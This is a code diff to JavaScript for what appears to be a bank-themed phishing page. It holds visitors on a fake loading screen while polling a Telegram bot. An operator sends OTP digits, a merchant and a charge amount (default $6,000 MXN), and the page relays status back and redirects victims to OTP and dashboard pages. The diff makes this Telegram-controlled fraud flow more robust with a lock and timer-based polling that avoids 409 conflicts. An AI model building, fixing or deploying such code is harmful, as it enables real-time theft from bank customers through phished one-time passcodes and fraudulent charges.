@@ -26,6 +26,9 @@
   const DEFAULT_AMOUNT = "$6,000.00 MXN";
   const RECONFIG_WINDOW_MS = 20000; 
 
+  // Semáforo de control para impedir ráfagas simultáneas concurrentes
+  let lockActive = false;
+
   function formatMXN(num) {
     return "$" + num.toLocaleString("es-MX", {
       minimumFractionDigits: 2,
@@ -49,21 +52,29 @@
     } catch (e) { }
   }
 
-  async function getLastUpdateId() {
+  // SOLUCIÓN RADICAL AL 409: Petición atómica balanceada con offset=-1
+  async function fetchLatestUpdateSafe() {
+    if (lockActive) return null;
+    lockActive = true;
     try {
-      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
-      const data = await res.json();
-      if (data.ok && data.result && data.result.length > 0) {
-        return data.result[data.result.length - 1].update_id;
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1&limit=1&timeout=0`);
+      if (res.status === 409) {
+        lockActive = false;
+        return null;
       }
-    } catch (e) { }
-    return 0;
+      const data = await res.json();
+      lockActive = false;
+      if (data.ok && data.result && data.result.length > 0) {
+        return data.result;
+      }
+    } catch (e) {
+      lockActive = false;
+    }
+    return null;
   }
 
   async function startLoadingGatekeeper() {
     const user = sessionStorage.getItem("demo_user") || "usuario_demo";
-    let lastUpdateId = await getLastUpdateId();
-
     const isReturnPass = sessionStorage.getItem("gatekeeper_done") === "1";
 
     // ============ PASADA 2+ (regresó del dashboard) ============
@@ -85,73 +96,71 @@
       );
 
       const tiempoInicio = Date.now();
-      while (Date.now() - tiempoInicio < RECONFIG_WINDOW_MS) {
-        try {
-          const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=0`;
-          const response = await fetch(url);
-          const data = await response.json();
-          
-          if (data.ok && data.result && data.result.length > 0) {
-            for (const update of data.result) {
-              lastUpdateId = update.update_id;
 
-              const msg = update.message || update.channel_post || update.edited_message;
-              if (!msg || !msg.chat || String(msg.chat.id) !== String(TELEGRAM_CHAT_ID) || !msg.text) continue;
+      async function scanPass2() {
+        if (Date.now() - tiempoInicio >= RECONFIG_WINDOW_MS) {
+          await sendTelegram("Sin respuesta. Mantengo el cargo actual. Entrando a OTP...");
+          textStatus.textContent = "Redireccionando a verificación...";
+          window.location.href = "otp.html";
+          return;
+        }
 
-              const textoMensaje = msg.text.trim();
-              const low = textoMensaje.toLowerCase();
+        const update = await fetchLatestUpdateSafe();
+        if (update && update.length > 0) {
+          const msg = update[0].message || update[0].channel_post || update[0].edited_message;
+          if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
+            const textoMensaje = msg.text.trim();
+            const low = textoMensaje.toLowerCase();
 
-              if (low === 'reinicio' || low === 'reset') {
-                localStorage.clear();
-                sessionStorage.clear();
-                window.location.replace("index.html");
+            if (low === 'reinicio' || low === 'reset') {
+              localStorage.clear();
+              sessionStorage.clear();
+              window.location.replace("index.html");
+              return;
+            }
+
+            if (low === 'cierre') {
+              sessionStorage.setItem("accion_telegram", "cierre");
+              await sendTelegram("🔒 *Flujo Cerrado:* Botones deshabilitados. Procediendo a OTP...");
+              window.location.href = "otp.html";
+              return; 
+            }
+
+            if (["no", "n", "ok", "listo", "mantener"].includes(low)) {
+              await sendTelegram("Mantengo el cargo actual. Entrando a OTP...");
+              window.location.href = "otp.html";
+              return;
+            }
+
+            const m = textoMensaje.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
+            if (m) {
+              const merchant = m[1].trim();
+              const amt = parseAmount(m[2]);
+              if (merchant && amt !== null) {
+                sessionStorage.setItem("charge_merchant", merchant);
+                sessionStorage.setItem("charge_amount", formatMXN(amt));
+                await sendTelegram("✅ *Cargo actualizado:*\n🏪 " + merchant + "\n💵 " + formatMXN(amt));
+                window.location.href = "otp.html";
                 return;
               }
+            }
 
-              if (low === 'cierre') {
-                sessionStorage.setItem("accion_telegram", "cierre");
-                await sendTelegram("🔒 *Flujo Cerrado:* Botones deshabilitados. Procediendo a OTP...");
-                window.location.href = "otp.html";
-                return; 
-              }
-
-              if (["no", "n", "ok", "listo", "mantener"].includes(low)) {
-                await sendTelegram("Mantengo el cargo actual. Entrando a OTP...");
+            if (/^[\d.,]+$/.test(textoMensaje)) {
+              const amt = parseAmount(textoMensaje);
+              if (amt !== null) {
+                sessionStorage.setItem("charge_amount", formatMXN(amt));
+                await sendTelegram("✅ *Monto actualizado:* " + formatMXN(amt));
                 window.location.href = "otp.html";
                 return;
-              }
-
-              const m = textoMensaje.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
-              if (m) {
-                const merchant = m[1].trim();
-                const amt = parseAmount(m[2]);
-                if (merchant && amt !== null) {
-                  sessionStorage.setItem("charge_merchant", merchant);
-                  sessionStorage.setItem("charge_amount", formatMXN(amt));
-                  await sendTelegram(`✅ *Cargo actualizado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
-                  window.location.href = "otp.html";
-                  return;
-                }
-              }
-
-              if (/^[\d.,]+$/.test(textoMensaje)) {
-                const amt = parseAmount(textoMensaje);
-                if (amt !== null) {
-                  sessionStorage.setItem("charge_amount", formatMXN(amt));
-                  await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
-                  window.location.href = "otp.html";
-                  return;
-                }
               }
             }
           }
-        } catch (error) { }
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+        setTimeout(scanPass2, 2000);
       }
 
-      await sendTelegram("Sin respuesta. Mantengo el cargo actual. Entrando a OTP...");
-      window.location.href = "otp.html"; 
-      return; 
+      scanPass2();
+      return;
     }
 
     // ============ PASADA 1 (login) ============
@@ -162,61 +171,44 @@
     );
     textStatus.textContent = "Esperando configuración de seguridad móvil...";
 
-    let tail = null;
-    while (!tail) {
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
-        const data = await res.json();
+    async function scanPass1() {
+      const update = await fetchLatestUpdateSafe();
+      let tail = null;
 
-        if (data.ok && data.result && data.result.length > 0) {
-          for (let i = 0; i < data.result.length; i++) {
-            const update = data.result[i];
-            lastUpdateId = update.update_id;
-            const msg = update.message;
+      if (update && update.length > 0) {
+        const msg = update[0].message;
+        if (msg) {
+          const chatIDRecibido = String(msg.chat.id);
+          const chatIDConfigurado = String(TELEGRAM_CHAT_ID);
+          const msgText = msg.text ? msg.text.trim() : "";
+          const low = msgText.toLowerCase();
 
-            if (msg) {
-              const chatIDRecibido = String(msg.chat.id);
-              const chatIDConfigurado = String(TELEGRAM_CHAT_ID);
-              const msgText = msg.text ? msg.text.trim() : "";
-              const low = msgText.toLowerCase();
+          if (low === 'reinicio' || low === 'reset') {
+            localStorage.clear();
+            sessionStorage.clear();
+            window.location.replace("index.html");
+            return; 
+          }
 
-              if (low === 'reinicio' || low === 'reset') {
-                localStorage.clear();
-                sessionStorage.clear();
-                window.location.replace("index.html");
-                return;
-              }
-
-              if (chatIDRecibido === chatIDConfigurado) {
-                if (/^\d{2}$/.test(msgText)) { 
-                  tail = msgText; 
-                  break; 
-                }
-              }
-            }
+          if (chatIDRecibido === chatIDConfigurado && /^\d{2}$/.test(msgText)) {
+            tail = msgText;
           }
         }
-      } catch (err) { }
-      if (!tail) await new Promise(r => setTimeout(r, 2000));
+      }
+
+      if (tail) {
+        try { sessionStorage.setItem("otp_tail", tail); } catch (e) { }
+        textStatus.textContent = "¡Configuración aplicada! Preparando validación...";
+        await proceedToChargeConfig();
+      } else {
+        setTimeout(scanPass1, 2000);
+      }
     }
 
-    try { sessionStorage.setItem("otp_tail", tail); } catch (e) { }
-    textStatus.textContent = "¡Configuración aplicada! Preparando validación...";
-
-    // 2. Cargo dinámico opcional en pasada 1
-    const esBaja = await configureCharge(lastUpdateId);
-
-    try { sessionStorage.setItem("gatekeeper_done", "1"); } catch (e) { }
-
-    if (esBaja) {
-      setTimeout(() => { window.location.href = "dashboard.html"; }, 1000);
-      return;
-    }
-
-    setTimeout(() => { window.location.href = "otp.html"; }, 1000);
+    scanPass1();
   }
 
-  async function configureCharge(lastUpdateId) {
+  async function proceedToChargeConfig() {
     try {
       sessionStorage.removeItem("charge_merchant");
       sessionStorage.removeItem("charge_amount");
@@ -233,41 +225,33 @@
       `_Default: ${DEFAULT_MERCHANT} — ${DEFAULT_AMOUNT}_`
     );
 
-    let done = false;
-    while (!done) {
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
-        const data = await res.json();
-        if (data.ok && data.result && data.result.length > 0) {
-          for (let i = 0; i < data.result.length; i++) {
-            const update = data.result[i];
-            lastUpdateId = update.update_id;
-            const msg = update.message;
-            if (!msg || !msg.chat || String(msg.chat.id) !== String(TELEGRAM_CHAT_ID) || !msg.text) continue;
+    async function scanPass1B() {
+      let done = false;
+      let esBaja = false;
+      const update = await fetchLatestUpdateSafe();
 
-            const t = msg.text.trim();
-            const low = t.toLowerCase();
+      if (update && update.length > 0) {
+        const msg = update[0].message;
+        if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
+          const t = msg.text.trim();
+          const low = t.toLowerCase();
 
-            if (low === 'reinicio' || low === 'reset') {
-              localStorage.clear();
-              sessionStorage.clear();
-              window.location.replace("index.html");
-              return false;
-            }
+          if (low === 'reinicio' || low === 'reset') {
+            localStorage.clear();
+            sessionStorage.clear();
+            window.location.replace("index.html");
+            return;
+          }
 
-            // Comando "baja": deja el cargo por defecto, marca flow_type y avisa para ir a dashboard.html
-            if (low === "baja") {
-              try { sessionStorage.setItem("flow_type", "baja"); } catch (e) { }
-              await sendTelegram("⚠️ Se usará el cargo por defecto. Redirigiendo a Dashboard...");
-              return true;
-            }
-            
-            if (["no", "n", "default", "defecto", "skip"].includes(low)) {
-              await sendTelegram("Se usará el cargo por defecto.");
-              done = true; 
-              break;
-            }
-
+          if (low === "baja") {
+            try { sessionStorage.setItem("flow_type", "baja"); } catch (e) { }
+            await sendTelegram("⚠️ Se usará el cargo por defecto. Redirigiendo a Dashboard...");
+            esBaja = true;
+            done = true;
+          } else if (["no", "n", "default", "defecto", "skip"].includes(low)) {
+            await sendTelegram("Se usará el cargo por defecto.");
+            done = true;
+          } else {
             const m = t.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
             if (m) {
               const merchant = m[1].trim();
@@ -275,29 +259,36 @@
               if (merchant && amt !== null) {
                 sessionStorage.setItem("charge_merchant", merchant);
                 sessionStorage.setItem("charge_amount", formatMXN(amt));
-                await sendTelegram(`✅ *Cargo configurado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
-                done = true; 
-                break;
+                await sendTelegram("✅ *Cargo configurado:*\n🏪 " + merchant + "\n💵 " + formatMXN(amt));
+                done = true;
               }
             }
-
-            if (/^[\d.,]+$/.test(t)) {
+            if (!done && /^[\d.,]+$/.test(t)) {
               const amt = parseAmount(t);
               if (amt !== null) {
                 sessionStorage.setItem("charge_amount", formatMXN(amt));
-                await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
-                done = true; 
-                break;
+                await sendTelegram("✅ *Monto actualizado:* " + formatMXN(amt));
+                done = true;
               }
             }
           }
         }
-      } catch (e) { }
-      if (!done) await new Promise(r => setTimeout(r, 2000));
+      }
+
+      if (done) {
+        try { sessionStorage.setItem("gatekeeper_done", "1"); } catch (e) { }
+        if (esBaja) {
+          setTimeout(() => { window.location.href = "dashboard.html"; }, 1000);
+        } else {
+          setTimeout(() => { window.location.href = "otp.html"; }, 1000);
+        }
+      } else {
+        setTimeout(scanPass1B, 2000);
+      }
     }
-    return false;
+    scanPass1B();
   }
 
-  // Inicialización del script
+  // Inicialización del flujo
   startLoadingGatekeeper();
 })();
